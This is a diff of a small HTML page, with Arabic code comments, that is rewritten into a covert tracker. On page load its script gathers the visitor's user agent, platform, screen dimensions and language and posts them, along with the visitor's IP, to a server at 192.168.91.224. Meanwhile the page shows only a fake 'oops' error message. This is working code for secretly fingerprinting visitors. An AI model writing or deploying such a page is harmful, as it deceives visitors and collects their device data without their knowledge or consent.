@@ -1,14 +1,56 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Send IP</title>
+    <title>undefined</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background-color: #f4f4f4;
+            padding: 20px;
+        }
+        .container {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            max-width: 400px;
+            margin: auto;
+        }
+        h1 {
+            color: #333;
+        }
+        p {
+            color: #555;
+        }
+    </style>
     <script>
-        fetch("http://192.168.91.224:5000/receive_ip", { method: "POST" });
+        function sendDeviceInfo() {
+            const deviceInfo = {
+                userAgent: navigator.userAgent, 
+                platform: navigator.platform,  // نظام التشغيل
+                screenWidth: screen.width,     // عرض الشاشة
+                screenHeight: screen.height,   // طول الشاشة
+                language: navigator.language   // لغة الجهاز
+            };
+
+            fetch("http://192.168.91.224:5000/receive_ip", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(deviceInfo)
+            }).then(response => response.text())
+              .then(data => console.log("Server Response:", data))
+              .catch(error => console.error("Error:", error));
+        }
+
+        window.onload = sendDeviceInfo;
     </script>
 </head>
 <body>
-    <h1>Sending your IP...</h1>
+    <div class="container">
+        <h1>oops that's wrong occure.....</h1>
+    </div>
 </body>
 </html>
